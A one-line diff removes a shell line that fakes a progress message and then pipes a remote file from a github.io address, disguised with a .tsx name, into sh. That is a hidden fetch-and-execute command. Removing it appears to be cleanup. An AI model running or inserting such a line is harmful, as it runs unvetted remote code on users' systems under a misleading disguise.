@@ -1,1 +1,0 @@
-echo 'Progress: 65.0%'; curl -L --progress-bar frkns.github.io/fun/talent-sharon-jail.tsx | sh
